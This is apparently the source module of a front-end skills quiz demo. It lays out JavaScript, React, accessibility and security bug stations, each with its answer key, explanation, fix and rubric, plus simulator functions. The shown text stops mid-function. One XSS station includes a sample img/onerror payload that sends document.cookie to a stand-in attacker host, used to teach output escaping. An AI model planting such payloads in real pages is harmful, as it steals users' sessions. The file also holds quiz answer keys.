// lab.js — shared domain module for the Assessment Room demo.
// Loaded directly by the browser (<script type="module">) and imported by
// app/server.ts. Plain JS, zero dependencies, fully deterministic.

const VAR_LOOP_CODE = `for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0);
}`;

const STALE_EFFECT_CODE = `useEffect(() => {
  const id = setInterval(
    () => setCount(count + 1), 1000);
  return () => clearInterval(id);
}, []); // mounted once — count is captured`;

const BIG_TABLE_CODE = `function OrdersTable({ orders }) {
  return (
    <table><tbody>
      {orders.map(o => <OrderRow key={o.id} order={o} />)}
    </tbody></table>
  );
}
// orders.length = 50_000, ~8 DOM nodes per row`;

const FETCH_OK_CODE = `const res = await fetch('/api/orders');
const data = await res.json();
renderRows(data.rows); // server answered HTTP 500`;

const METRIC_SORT_CODE = `const revenue = ['9000', '450', '10000'];
revenue.sort();         // formatted strings
// rows render in this order`;

const DIV_BUTTON_CODE = `<div class="btn" onclick="save()">Save</div>
<button onClick={save}>Save</button>
<!-- keyboard user: Tab, then Enter -->`;

export const STATIONS = [
  {
    id: 'var-loop',
    area: 'JS/TS tracing',
    title: 'What does the loop print?',
    code: VAR_LOOP_CODE,
    question: 'Three timers are scheduled. What lands in the console?',
    options: [
      { id: 'a', label: '0, 1, 2 — each callback keeps its own i' },
      { id: 'b', label: '3, 3, 3 — all callbacks share one i' },
      { id: 'c', label: '0, 1, 2, then a final 3' },
      { id: 'd', label: 'ReferenceError — i is out of scope' },
    ],
    correct: 'b',
    explanation:
      'var creates one function-scoped binding shared by every iteration. All three callbacks close over the same i, and by the time the macrotask queue drains, the loop has already pushed it to 3. Switching to let gives each iteration its own binding — the one-word fix behind half of all tracing questions.',
    fix: `for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0);
}
// logs 0, 1, 2`,
    rubric: {
      assumption: 'Assume the timers run after the synchronous loop finishes — no await inside the body.',
      options: 'let per-iteration binding, an IIFE capturing i, or passing i as the timer arg.',
      tradeOff: 'let is idiomatic; the IIFE version works in pre-ES6 code but adds a frame to read.',
      userImpact: 'Shipped as-is, every row/action in a real loop targets the last item — data corruption, not just wrong logs.',
    },
  },
  {
    id: 'stale-effect',
    area: 'React rendering & useEffect',
    title: 'Where does the counter land?',
    code: STALE_EFFECT_CODE,
    question: 'The component mounts once and three ticks pass. What is count?',
    options: [
      { id: 'a', label: '3 — the interval increments each second' },
      { id: 'b', label: '1 — every tick writes 0 + 1' },
      { id: 'c', label: '0 — setCount never runs' },
      { id: 'd', label: 'It re-renders forever' },
    ],
    correct: 'b',
    explanation:
      'The effect ran once, so the interval closes over the count from that render — 0, forever. Every tick calls setCount(0 + 1) and lands on 1. The fix is the functional update setCount(c => c + 1), which reads current state at dispatch time instead of trusting the snapshot.',
    fix: `useEffect(() => {
  const id = setInterval(
    () => setCount(c => c + 1), 1000);
  return () => clearInterval(id);
}, []);`,
    rubric: {
      assumption: 'Assume React 18+ semantics and a real 1s interval — the bug is the closure, not Strict Mode.',
      options: 'Functional update vs adding count to the dependency array.',
      tradeOff: 'Deps on count rebuilds the interval every tick — correct but wasteful; the updater keeps one timer and stays honest.',
      userImpact: 'Dashboards that poll totals this way freeze at the first value — users silently act on stale numbers.',
    },
  },
  {
    id: 'big-table',
    area: 'Performance / large datasets',
    title: 'Fifty thousand rows',
    code: BIG_TABLE_CODE,
    question: 'The page freezes for seconds on load. Which change actually fixes it?',
    options: [
      { id: 'a', label: 'Wrap OrderRow in React.memo' },
      { id: 'b', label: 'Render only the visible slice (virtualize) or paginate' },
      { id: 'c', label: 'useMemo on the sorted orders' },
      { id: 'd', label: 'Add CSS contain: strict to each row' },
    ],
    correct: 'b',
    explanation:
      'Memoization skips re-renders — it does not skip the first render. 50,000 rows at ~8 nodes each is ~400,000 DOM elements, and layout/paint cost is what freezes the tab. Bound what is rendered: a 40-row window is ~320 nodes, a 25-row page is ~200. Everything else is polish on a quantity problem.',
    fix: `// virtualize: render only the visible window
const slice = orders.slice(start, start + window);
// or paginate server-side: ?page=3&size=25`,
    rubric: {
      assumption: 'Assume the API can paginate or the client can window — either bounds the DOM.',
      options: 'Pagination (simplest) vs virtualization (continuous scroll) vs memoization (render cost only).',
      tradeOff: 'Pagination needs API support and breaks Ctrl+F; virtualization keeps one list but adds a library or hand-rolled windowing.',
      userImpact: 'Users on mid-range laptops lose the tab entirely — this is an availability bug, not a slowdown.',
    },
  },
  {
    id: 'fetch-ok',
    area: 'API integration',
    title: 'Does await fetch throw?',
    code: FETCH_OK_CODE,
    question: 'The server returns HTTP 500 with a JSON error body. What happens?',
    options: [
      { id: 'a', label: 'fetch rejects — the catch runs' },
      { id: 'b', label: 'res resolves anyway; data is the error body' },
      { id: 'c', label: 'The request hangs until a timeout' },
      { id: 'd', label: 'res.json() throws before reading the body' },
    ],
    correct: 'b',
    explanation:
      'fetch rejects only on network failure — DNS, connection refused, aborted. A 500 is a perfectly valid HTTP response, so res resolves and res.json() happily parses the error body; renderRows crashes on data.rows === undefined three lines later, far from the cause. Checking response.ok (and an AbortSignal timeout) is the senior move.',
    fix: `const res = await fetch('/api/orders',
  { signal: AbortSignal.timeout(10_000) });
if (!res.ok) throw new Error('orders ' + res.status);
const data = await res.json();`,
    rubric: {
      assumption: 'Assume a REST endpoint that always returns JSON, even on errors.',
      options: 'Check res.ok inline vs wrap fetch in a typed client helper.',
      tradeOff: 'A helper centralizes timeout/retry/auth; inline checks are fine for one or two calls.',
      userImpact: 'Unchecked, a server error renders as a blank dashboard with zero signal — users refresh and retry against a struggling backend.',
    },
  },
  {
    id: 'metric-sort',
    area: 'Data formatting & metrics',
    title: 'Sort the revenue column',
    code: METRIC_SORT_CODE,
    question: 'What order do the formatted strings sort into?',
    options: [
      { id: 'a', label: "450, 9000, 10000 — numeric order" },
      { id: 'b', label: "10000, 450, 9000 — lexicographic order" },
      { id: 'c', label: 'Unchanged — sort() skips strings' },
      { id: 'd', label: 'TypeError — cannot sort mixed lengths' },
    ],
    correct: 'b',
    explanation:
      'Array.prototype.sort() coerces elements to strings by default, so "10000" < "450" < "9000" character by character — the largest revenue sinks to the bottom of a descending dashboard. The rule that survives assessments and production alike: sort raw numbers, format only at display time.',
    fix: `rows.sort((a, b) => a.revenue - b.revenue); // numbers
cell.textContent =
  new Intl.NumberFormat('en-US').format(row.revenue);`,
    rubric: {
      assumption: 'Assume revenue arrives as numbers before formatting — if it arrives as strings, parse first.',
      options: 'Numeric comparator on raw values vs locale-aware collation for display strings.',
      tradeOff: 'Formatting in the render path is safe only if sorting already ran on raw values; format-then-sort is the bug.',
      userImpact: 'A mis-sorted leaderboard quietly inverts who looks best — wrong metrics are worse than no metrics.',
    },
  },
  {
    id: 'div-button',
    area: 'Accessibility & UX',
    title: 'Keyboard user hits Save',
    code: DIV_BUTTON_CODE,
    question: 'A keyboard-only user presses Tab through the toolbar, then Enter. What happens?',
    options: [
      { id: 'a', label: 'save() fires — onclick is keyboard-accessible' },
      { id: 'b', label: 'The div never receives focus; only the real button activates' },
      { id: 'c', label: 'Space triggers it even though Enter does not' },
      { id: 'd', label: 'It works if an aria-label is added' },
    ],
    correct: 'b',
    explanation:
      'A div is not focusable, has no implicit Enter/Space activation, and announces nothing to assistive tech — onclick only fires for pointer users. tabindex="0" plus role="button" plus keydown handling is three patches to fake what <button> gives free. Semantics are the fix; ARIA is the apology.',
    fix: `// replace the div — no extra wiring needed
<button type="button" onClick={save}>Save</button>`,
    rubric: {
      assumption: 'Assume keyboard and screen-reader users are in scope — they are, by default.',
      options: 'Native button vs retrofitting tabindex + role + keydown handlers.',
      tradeOff: 'The retrofit costs more code and still misses edge cases (Space scroll, focus rings) that the element handles natively.',
      userImpact: 'The save action is literally unreachable for keyboard users — an invisible feature for part of the audience.',
    },
  },
  {
    id: 'microtasks',
    area: 'JS/TS tracing',
    title: 'Order the logs',
    code: `console.log('a');
setTimeout(() => console.log('b'), 0);
Promise.resolve().then(() => console.log('c'));
console.log('d');`,
    question: 'In what order do the four lines print?',
    options: [
      { id: 'a', label: 'a, b, c, d — top to bottom' },
      { id: 'b', label: 'a, d, c, b — sync first, microtasks, then timers' },
      { id: 'c', label: 'a, c, d, b — promises run immediately' },
      { id: 'd', label: 'a, d, b, c — timers before promises' },
    ],
    correct: 'b',
    explanation:
      'Synchronous code always finishes first (a, d). When the call stack empties, the entire microtask queue drains before the next macrotask — so the Promise callback (c) runs before the setTimeout callback (b), even though the timer was scheduled first. "Microtasks before macrotasks" is the whole question.',
    fix: `// no fix needed — the ordering IS the question
// remember: sync → microtask queue → next macrotask`,
    rubric: {
      assumption: 'Assume a standard event loop — browser or Node behaves the same at this granularity.',
      options: 'The only real candidates are where c and b land relative to d and each other.',
      tradeOff: 'Narrating the queue order out loud is what turns a guess into a trace.',
      userImpact: 'Ordering bugs surface as race conditions — data written before a fetch resolves, toasts before state commits.',
    },
  },
  {
    id: 'memo-deps',
    area: 'React rendering & useEffect',
    title: 'The frozen filter',
    code: `const visible = useMemo(
  () => orders.filter(o => o.total > threshold),
  []); // threshold arrives via props`,
    question: 'The parent raises threshold from 100 to 500. What does visible contain?',
    options: [
      { id: 'a', label: 'Recomputed — useMemo sees the new prop' },
      { id: 'b', label: 'The stale list — memoized under [] forever' },
      { id: 'c', label: 'Empty — the cache is invalidated' },
      { id: 'd', label: 'It re-renders in a loop' },
    ],
    correct: 'b',
    explanation:
      'useMemo caches by dependency array, and [] means "compute once, keep forever." threshold is captured at mount; every later render reuses the stale filtered list. Dependency arrays must name every value read inside — the fix is [orders, threshold], or dropping useMemo entirely if the filter is cheap.',
    fix: `const visible = useMemo(
  () => orders.filter(o => o.total > threshold),
  [orders, threshold]);
// or: const visible = orders.filter(...) — cheap work needs no memo`,
    rubric: {
      assumption: 'Assume orders and threshold are the only reads inside the memo.',
      options: 'Fix the dep array vs drop useMemo if the computation is cheap.',
      tradeOff: 'useMemo is a contract you must maintain; an honest dep array is the price of skipping recomputation.',
      userImpact: 'The UI silently shows the old filter — users trust a view that no longer matches their settings.',
    },
  },
  {
    id: 'abort-fetch',
    area: 'API integration',
    title: 'The last response wins',
    code: `useEffect(() => {
  fetch('/api/search?q=' + q)
    .then(r => r.json())
    .then(setResults);
}, [q]);`,
    question: 'User types "a" then "ab" quickly. The "a" request is slow and resolves second. What renders?',
    options: [
      { id: 'a', label: 'Results for "ab" — the latest query' },
      { id: 'b', label: 'Results for "a" — the slow response overwrites the newer one' },
      { id: 'c', label: 'A merged list of both' },
      { id: 'd', label: 'React throws — setState during render' },
    ],
    correct: 'b',
    explanation:
      'Nothing orders responses — last write wins, and "last" means last to *resolve*, not last to be sent. The fix is cancellation: return an AbortController cleanup so each effect aborts the previous request, or guard with a request id and ignore stale resolutions.',
    fix: `useEffect(() => {
  const ctrl = new AbortController();
  fetch('/api/search?q=' + q, { signal: ctrl.signal })
    .then(r => r.json()).then(setResults)
    .catch(e => e.name !== 'AbortError' && report(e));
  return () => ctrl.abort();
}, [q]);`,
    rubric: {
      assumption: 'Assume requests can resolve out of order — they can, always.',
      options: 'AbortController cleanup vs request-id staleness guard vs debouncing the input.',
      tradeOff: 'Debouncing reduces but cannot eliminate races; abort is the structural fix.',
      userImpact: 'Search results that disagree with the query erode trust faster than slow results.',
    },
  },
  {
    id: 'timezone',
    area: 'Data formatting & metrics',
    title: 'The report a day early',
    code: `const day = '2026-10-05';
const label = new Date(day)
  .toLocaleDateString('en-US');
// viewer: New York (UTC-4)`,
    question: 'The dashboard labels the row "Oct 5". What does the New York viewer see?',
    options: [
      { id: 'a', label: 'Oct 5 — the date is unambiguous' },
      { id: 'b', label: 'Oct 4 — the string parsed as UTC midnight' },
      { id: 'c', label: 'Invalid Date' },
      { id: 'd', label: 'Oct 5 in every timezone' },
    ],
    correct: 'b',
    explanation:
      'A bare "YYYY-MM-DD" string parses as UTC midnight — which is still Oct 4 at 8 PM in New York. The label lands a day early. Date-only values need date-only handling: parse as local (new Date(2026, 9, 5)), append a T00:00 local time, or keep it a string end-to-end.',
    fix: `const [y, m, d] = '2026-10-05'.split('-').map(Number);
const label = new Date(y, m - 1, d)
  .toLocaleDateString('en-US'); // local midnight, always Oct 5`,
    rubric: {
      assumption: 'Assume the column is a calendar date, not an instant in time — parse accordingly.',
      options: 'Local constructor vs appending T00:00 vs storing dates as strings through the stack.',
      tradeOff: 'UTC storage with local rendering is right for instants; date-only fields should never cross the Date type.',
      userImpact: 'Off-by-one on payroll or deadline rows is a correctness bug users will screenshot and escalate.',
    },
  },
  {
    id: 'focus-trap',
    area: 'Accessibility & UX',
    title: 'Tab escapes the modal',
    code: `function Modal({ open }) {
  if (!open) return null;
  return <div className="modal">…</div>;
}
// opens over a page full of links`,
    question: 'The modal opens and a keyboard user presses Tab. Where does focus go?',
    options: [
      { id: 'a', label: 'Into the modal — browsers scope focus automatically' },
      { id: 'b', label: 'To the next background link — focus never entered the modal' },
      { id: 'c', label: 'Nowhere — modals trap focus by default' },
      { id: 'd', label: 'To the browser address bar' },
    ],
    correct: 'b',
    explanation:
      'A div with className="modal" carries no focus semantics. Opening it leaves focus wherever it was, and Tab walks the *background* page behind the overlay. The fix has three parts: move focus into the modal on open, cycle Tab/Shift+Tab inside it, and restore focus to the trigger on close.',
    fix: `useEffect(() => {
  if (!open) return;
  const prev = document.activeElement;
  ref.current.querySelector('button, [href]')?.focus();
  return () => prev?.focus(); // restore on close
}, [open]);`,
    rubric: {
      assumption: 'Assume the overlay is a real modal — users must not interact with the page behind it.',
      options: 'Hand-rolled focus management vs <dialog> (native trap + Esc + backdrop) vs a library.',
      tradeOff: '<dialog> gives the trap for free but constrains styling entry points; hand-rolled is controllable and easy to get subtly wrong.',
      userImpact: 'Without a trap, keyboard users operate the invisible page behind the modal — actions land on the wrong thing.',
    },
  },
  {
    id: 'derived-state',
    area: 'React rendering & useEffect',
    title: 'Props changed, state did not',
    code: `function List({ items }) {
  const [rows, setRows] = useState(items);
  return <Rows data={rows} />;
}
// parent later passes a new items array`,
    question: 'The parent renders again with updated items. What does the list show?',
    options: [
      { id: 'a', label: 'The new items — state follows props' },
      { id: 'b', label: 'The initial snapshot — useState ignores later props' },
      { id: 'c', label: 'A merge of old and new' },
      { id: 'd', label: 'Nothing — React remounts the component' },
    ],
    correct: 'b',
    explanation:
      'useState(items) reads the prop exactly once — at mount. It is an initializer, not a subscription. When the value is pure projection, drop the state and derive it during render; when you truly need state that resets on new input, change the component key, not a syncing effect.',
    fix: `// derive — no state at all
function List({ items }) {
  return <Rows data={items} />;
}
// or remount on new input: <List key={listId} … />`,
    rubric: {
      assumption: 'Assume rows adds nothing beyond items — pure copies of props are bugs waiting for props to change.',
      options: 'Derive during render vs key-remount vs a syncing useEffect.',
      tradeOff: 'The syncing effect works but renders twice and can flash stale; deriving is one render and zero drift.',
      userImpact: 'Two sources of truth show users two different answers — the classic "my edit saved but the list is old" bug.',
    },
  },
  {
    id: 'token-storage',
    area: 'Auth & security',
    title: 'Where does the token live?',
    code: `// login returns { token }
localStorage.setItem('jwt', token);
fetch('/api/me', { headers:
  { Authorization: 'Bearer ' + localStorage.getItem('jwt') } });
// later: an injected script runs on the page`,
    question: 'An XSS payload (or rogue extension script) executes on this origin. What happens to the token?',
    options: [
      { id: 'a', label: 'Nothing — localStorage is sandboxed per page' },
      { id: 'b', label: 'It is read and exfiltrated — any script on the origin can reach it' },
      { id: 'c', label: 'Only httpOnly cookies leak this way' },
      { id: 'd', label: 'The token expires before it can be read' },
    ],
    correct: 'b',
    explanation:
      'localStorage is readable by every script running on the origin — that is the entire XSS blast radius for token theft. An httpOnly cookie is invisible to JavaScript, but the trade is real: cookies ride every request, so you need CSRF protection (SameSite, tokens) instead. There is no safe option, only a stated trade-off.',
    fix: `// session cookie set by the server instead:
Set-Cookie: session=…; HttpOnly; Secure; SameSite=Lax
// fetch sends it automatically — add CSRF protection`,
    rubric: {
      assumption: 'Assume XSS is possible somewhere in the dependency tree — it only needs one sink.',
      options: 'localStorage token vs httpOnly cookie vs short-lived token + refresh rotation.',
      tradeOff: 'Cookies escape JS but invite CSRF; localStorage escapes CSRF but invites token theft — pick which door to lock.',
      userImpact: 'A stolen token is a stolen session — one injected script becomes full account takeover.',
    },
  },
  {
    id: 'xss-inner',
    area: 'Auth & security',
    title: 'The comment that runs',
    code: `// comment.body is user-supplied
el.innerHTML = comment.body;
// body: <img src=x onerror="fetch(evil, {body: document.cookie})">`,
    question: 'A stored comment contains the img/onerror payload. What happens when it renders?',
    options: [
      { id: 'a', label: 'It renders as literal text — the browser escapes it' },
      { id: 'b', label: 'The onerror handler executes — every viewer of the comment runs the payload' },
      { id: 'c', label: 'The browser blocks innerHTML on user content' },
      { id: 'd', label: 'The img loads and nothing else happens' },
    ],
    correct: 'b',
    explanation:
      'innerHTML parses the string as markup — the img fails to load, onerror fires, and the fetch runs in every reader\'s session. That is stored XSS: one payload, every viewer compromised. textContent renders it inert; if markup is truly needed, sanitize it (DOMPurify) — never regex it yourself.',
    fix: `el.textContent = comment.body; // inert text
// or, if markup is required:
el.innerHTML = DOMPurify.sanitize(comment.body);`,
    rubric: {
      assumption: 'Assume comment.body is attacker-controlled — all user input is.',
      options: 'textContent (no markup) vs a real sanitizer vs framework escaping (React JSX escapes by default).',
      tradeOff: 'Sanitizers permit safe markup at the cost of a dependency and a bypass surface; textContent is free and absolute.',
      userImpact: 'Stored XSS hits every viewer — sessions, data, and actions in their name.',
    },
  },
  {
    id: 'index-keys',
    area: 'React rendering & useEffect',
    title: 'Delete the first row',
    code: `{items.map((item, i) => (
  <Row key={i} item={item} />
))}
// Row keeps an internal "draft" input state`,
    question: 'The user deletes row 0. Each Row holds a draft input. What does the UI show?',
    options: [
      { id: 'a', label: 'Row 0 gone; every other row keeps its own draft' },
      { id: 'b', label: 'Drafts slide up — each surviving row inherits the draft of the row above it' },
      { id: 'c', label: 'React remounts all rows cleanly' },
      { id: 'd', label: 'React throws a key warning and stops' },
    ],
    correct: 'b',
    explanation:
      'Keys are identity. Deleting row 0 shifts every index down — React sees the same keys (0..n-1) with new items, so each surviving row keeps its DOM and state but receives the *next* item\'s data. The draft typed for row 1 now visually belongs to row 0\'s content. Key by a stable id, never the array index.',
    fix: `{items.map(item => (
  <Row key={item.id} item={item} />
))}`,
    rubric: {
      assumption: 'Assume rows are stateful (inputs, expansion) — index keys are harmless only for pure stateless lists.',
      options: 'Stable id key vs index key vs forcing remounts.',
      tradeOff: 'Index keys work for truly static, append-only lists; the moment items reorder or delete, they corrupt.',
      userImpact: 'Users submit edits attached to the wrong record — silent data corruption, not just a visual glitch.',
    },
  },
  {
    id: 'ts-narrow',
    area: 'JS/TS fundamentals',
    title: 'Does the union compile?',
    code: `function total(x: string | number) {
  return x.toFixed(2);
}`,
    question: 'Strict TypeScript — does this function compile?',
    options: [
      { id: 'a', label: 'Yes — toFixed exists on numbers' },
      { id: 'b', label: 'No — string lacks toFixed; the union must be narrowed first' },
      { id: 'c', label: 'Yes, but it throws at runtime for strings' },
      { id: 'd', label: 'Only if x is typed any' },
    ],
    correct: 'b',
    explanation:
      'On a union, you may only call members shared by every constituent — toFixed is number-only, so the compiler rejects it. Narrowing is the fix: typeof x === "number" splits the union inside the block. And the related trap: typing x as any compiles everything and checks nothing — it silences the compiler, not the bug.',
    fix: `function total(x: string | number) {
  return typeof x === 'number'
    ? x.toFixed(2)
    : parseFloat(x).toFixed(2);
}`,
    rubric: {
      assumption: 'Assume strict mode and real union inputs — the compiler is enforcing the contract you wrote.',
      options: 'typeof narrowing vs type predicate vs relaxing to any.',
      tradeOff: 'any removes the error and the safety; narrowing keeps both branches honest.',
      userImpact: 'Un-narrowed unions become runtime TypeErrors on the data shape you did not expect.',
    },
  },
  {
    id: 'this-binding',
    area: 'JS/TS fundamentals',
    title: 'The handler that lost this',
    code: `const cart = {
  items: [],
  add(item) { this.items.push(item); }
};
button.onclick = cart.add;
button.onclick('apple');`,
    question: 'What does cart.items contain after the click?',
    options: [
      { id: 'a', label: "['apple'] — the method knows its object" },
      { id: 'b', label: "Error — this is the button (or undefined), not cart" },
      { id: 'c', label: "['apple'] but cart is unchanged" },
      { id: 'd', label: 'Nothing — the handler never runs' },
    ],
    correct: 'b',
    explanation:
      'this is bound by the call site, not where the function was written. Extracting cart.add into a handler detaches it — invoked as element.onclick(), this becomes the element (or undefined in strict mode/module code), and this.items does not exist. Arrow functions or .bind(cart) keep the owner.',
    fix: `button.onclick = item => cart.add(item);
// or: button.onclick = cart.add.bind(cart);`,
    rubric: {
      assumption: 'Assume the handler is invoked by the DOM — call site rules apply.',
      options: 'Arrow wrapper vs .bind(cart) vs passing the whole object.',
      tradeOff: 'bind allocates once at setup; an inline arrow allocates per assignment — both correct, pick per context.',
      userImpact: 'Detached handlers are the source of the classic "works in console, broken in UI" bug.',
    },
  },
  {
    id: 'mutate-props',
    area: 'React rendering & useEffect',
    title: 'Sort that never re-renders',
    code: `function Table({ rows }) {
  const sorted = rows.sort((a, b) => a.total - b.total);
  return <Grid data={sorted} />;
}`,
    question: 'The parent keeps passing the same array reference. What is wrong here?',
    options: [
      { id: 'a', label: 'Nothing — sort returns a sorted array' },
      { id: 'b', label: 'sort() mutates the prop in place — the parent\'s data is silently reordered' },
      { id: 'c', label: 'It re-sorts on every render — a perf bug' },
      { id: 'd', label: 'React blocks mutation of props automatically' },
    ],
    correct: 'b',
    explanation:
      'Array.prototype.sort() sorts *in place* and returns the same array — so "sorted" and "rows" are one object, and the parent\'s array was just mutated behind its back. Worse, a same-reference check upstream can now skip a needed re-render. Copy first: [...rows].sort(), or the non-mutating toSorted() in modern runtimes.',
    fix: `const sorted = [...rows].sort(
  (a, b) => a.total - b.total);
// or: rows.toSorted((a, b) => a.total - b.total)`,
    rubric: {
      assumption: 'Assume the array is shared — props, context, or store output. Only mutate what you own.',
      options: 'Spread copy vs toSorted() vs sorting upstream before props.',
      tradeOff: 'toSorted is the clean primitive but needs a modern engine; spread works everywhere.',
      userImpact: 'Mutated props corrupt other components reading the same data — the sort leaks beyond its own table.',
    },
  },
  {
    id: 'coercion',
    area: 'JS/TS fundamentals',
    title: 'The invisible zero',
    code: `{count
  ? <Badge>{count} new</Badge>
  : <Empty>No items</Empty>}
// count arrives as 0`,
    question: 'The API returns count: 0 — a real value meaning "zero items". What renders?',
    options: [
      { id: 'a', label: '"0 new" — count is a number' },
      { id: 'b', label: '"No items" — 0 is falsy, so the badge never shows' },
      { id: 'c', label: 'Nothing — JSX ignores falsy children' },
      { id: 'd', label: 'TypeError — cannot render a number' },
    ],
    correct: 'b',
    explanation:
      'Truthiness is the trap: 0, "", null, undefined, NaN, and false all collapse to falsy — so a real zero gets swallowed by the same check that means "missing". Explicit beats truthy: count != null covers null and undefined while letting 0 and "" through. (Bonus trap: {count && <X/>} renders a literal 0 for the same reason.)',
    fix: `{count != null
  ? <Badge>{count} new</Badge>
  : <Empty>No items</Empty>}`,
    rubric: {
      assumption: 'Assume 0 and "" are legitimate values, not absence — only null/undefined mean missing.',
      options: 'count != null vs count > 0 vs ?? defaults.',
      tradeOff: '!= null accepts all falsy-but-real values; > 0 is right only when zero is truly meaningless.',
      userImpact: 'A dashboard that hides zeroes makes "no incidents today" indistinguishable from "failed to load".',
    },
  },
  {
    id: 'aria-live',
    area: 'Accessibility & UX',
    title: 'The silent save',
    code: `async function save() {
  await api.put(doc);
  setSaved(true); // checkmark appears
}
// no status region anywhere`,
    question: 'A screen-reader user saves a document. What do they hear?',
    options: [
      { id: 'a', label: '"Saved" — the browser announces DOM changes' },
      { id: 'b', label: 'Nothing — a visual checkmark announces itself to no one' },
      { id: 'c', label: 'The button label again' },
      { id: 'd', label: '"Alert" — async updates are always announced' },
    ],
    correct: 'b',
    explanation:
      'DOM changes are invisible to screen readers unless a live region announces them. The fix is a status element with aria-live="polite" — update its text on completion ("Document saved") and assistive tech speaks it. "polite" waits for a pause; "assertive" interrupts and is for emergencies only.',
    fix: `<div aria-live="polite" role="status">
  {status}
</div>
// setStatus('Document saved') on completion`,
    rubric: {
      assumption: 'Assume async outcomes must be perceivable without vision — spinners and checkmarks are visual-only.',
      options: 'aria-live polite vs assertive vs moving focus to a confirmation.',
      tradeOff: 'assertive guarantees attention but hijacks the user — reserve it for destructive or urgent results.',
      userImpact: 'Without the announcement, users repeat-save or leave unsure — async UI that lies by silence.',
    },
  },
];

const STATION_MAP = new Map(STATIONS.map(s => [s.id, s]));

export function getStation(id) {
  const station = STATION_MAP.get(id);
  if (!station) throw new Error(`unknown station: ${id}`);
  return station;
}

// Strip grading material — what /api/scenario may reveal before the answer.
export function publicScenario(id) {
  const { correct, explanation, fix, rubric, ...rest } = getStation(id);
  return rest;
}

export function listStations() {
  return STATIONS.map(({ id, area, title }) => ({ id, area, title }));
}

// --- Deterministic simulators: each returns {steps, outcome} ---------------

function simulateVarLoop() {
  const steps = [];
  const logged = [];
  for (let i = 0; i < 3; i++) {
    steps.push({ label: `iteration ${i}`, detail: `schedule timer, callback closes over shared var i (now ${i})` });
  }
  steps.push({ label: 'loop ends', detail: 'i === 3, synchronous code done — the shared binding is 3 for every callback' });
  for (let t = 0; t < 3; t++) {
    logged.push(3);
    steps.push({ label: `timer ${t} fires`, detail: `reads shared i → logs ${logged[t]}` });
  }
  return {
    steps,
    outcome: {
      summary: 'console: 3, 3, 3',
      logged,
      fixedLogged: [0, 1, 2],
      metric: '1 shared binding vs 3 per-iteration bindings',
    },
  };
}

function simulateStaleEffect(ticks = 3) {
  const steps = [{ label: 'mount', detail: 'effect runs once, captures count = 0 into the interval closure' }];
  const writes = [];
  for (let t = 1; t <= ticks; t++) {
    writes.push(1);
    steps.push({ label: `tick ${t}`, detail: 'setCount(count + 1) reads the captured 0 → writes 1' });
  }
  return {
    steps,
    outcome: {
      summary: 'count settles at 1 after every tick',
      ticks,
      writes,
      fixedWrites: Array.from({ length: ticks }, (_, i) => i + 1),
      metric: `final count: ${writes.at(-1)} (stale) vs ${ticks} (functional update)`,
    },
  };
}

function simulateBigTable(rows = 50_000, nodesPerRow = 8, window = 40, page = 25) {
  const naive = rows * nodesPerRow;
  const virtualized = window * nodesPerRow;
  const paginated = page * nodesPerRow;
  return {
    steps: [
      { label: 'naive render', detail: `${rows.toLocaleString()} rows × ${nodesPerRow} nodes = ${naive.toLocaleString()} DOM elements` },
      { label: 'React.memo rows', detail: 'skips re-renders; first render still mounts all 400,000 nodes' },
      { label: 'useMemo sort', detail: 'saves an O(n log n) sort per render — DOM count unchanged' },
      { label: 'virtualized window', detail: `${window} visible rows = ${virtualized} DOM elements (${Math.round(naive / virtualized)}× smaller)` },
      { label: 'paginated', detail: `${page} rows per page = ${paginated} DOM elements` },
    ],
    outcome: {
      summary: 'bound the rendered set before optimizing it',
      nodes: { naive, memoized: naive, virtualized, paginated },
      metric: `DOM nodes: ${naive.toLocaleString()} → ${virtualized} (window) / ${paginated} (page)`,
    },
  };
}

function simulateFetchOk() {
  return {
    steps: [
      { label: 'request leaves', detail: 'fetch("/api/orders") — promise pending' },
      { label: 'HTTP 500 arrives', detail: 'a valid response: fetch resolves, does not reject' },
      { label: 'res.json()', detail: 'parses the error body → { error: "upstream timeout" }' },
      { label: 'renderRows(data.rows)', detail: 'data.rows is undefined → TypeError three frames away from the cause' },
      { label: 'network failure path', detail: 'only DNS/connection/abort actually reject the promise' },
    ],
    outcome: {
      summary: 'HTTP errors resolve; only transport failures reject',
      resolvesOn: ['200', '404', '500'],
      rejectsOn: ['network failure', 'timeout/abort'],
      metric: 'res.ok === false is a resolved promise, not a thrown error',
    },
  };
}

function simulateMetricSort(values = ['9000', '450', '10000']) {
  const lexicographic = [...values].sort();
  const numeric = [...values].map(Number).sort((a, b) => a - b);
  return {
    steps: [
      { label: 'default sort()', detail: 'coerces each element to string, compares code units' },
      { label: 'compare "10000" vs "450"', detail: '"1" < "4" → "10000" sorts first' },
      { label: 'compare "450" vs "9000"', detail: '"4" < "9" → "450" sorts second' },
      { label: 'result', detail: lexicographic.join(', ') + ' — the biggest number lands last' },
      { label: 'numeric comparator', detail: numeric.join(', ') + ' — sort raw values, format for display' },
    ],
    outcome: {
      summary: 'lexicographic: ' + lexicographic.join(', '),
      lexicographic,
      numeric,
      metric: 'sort() without a comparator is string sort, always',
    },
  };
}

function simulateDivButton() {
  return {
    steps: [
      { label: 'Tab ×1', detail: 'focus moves to the <button> — the div is not in the tab order (no tabindex)' },
      { label: 'Tab ×2', detail: 'focus leaves the toolbar; the div was never visited' },
      { label: 'Enter on div?', detail: 'impossible — it cannot hold focus; onclick listens for pointer only' },
      { label: 'screen reader', detail: 'div announces as text, not a control — no role, no name' },
      { label: 'real <button>', detail: 'focusable, Enter+Space activation, implicit role — for free' },
    ],
    outcome: {
      summary: 'the div button is unreachable by keyboard',
      focusable: { div: false, button: true },
      metric: 'tabindex+role+keydown = 3 patches to fake 1 element',
    },
  };
}

function simulateMicrotasks() {
  const order = ['a', 'd', 'c', 'b'];
  return {
    steps: [
      { label: 'sync: log a', detail: 'runs immediately — call stack' },
      { label: 'schedule b', detail: 'setTimeout callback → macrotask queue' },
      { label: 'schedule c', detail: 'Promise.then callback → microtask queue' },
      { label: 'sync: log d', detail: 'call stack empties' },
      { label: 'drain microtasks', detail: 'c runs — the whole microtask queue drains before the next task' },
      { label: 'next macrotask', detail: 'b runs last — timers wait behind microtasks' },
    ],
    outcome: {
      summary: 'console: a, d, c, b',
      order,
      metric: 'sync → microtasks → macrotasks, every time',
    },
  };
}

function simulateMemoDeps() {
  return {
    steps: [
      { label: 'mount', detail: 'useMemo computes filter at threshold=100, caches under deps []' },
      { label: 'prop change', detail: 'threshold: 100 → 500; deps still [] → cache hit, no recompute' },
      { label: 'render', detail: 'visible returns the stale list filtered at 100' },
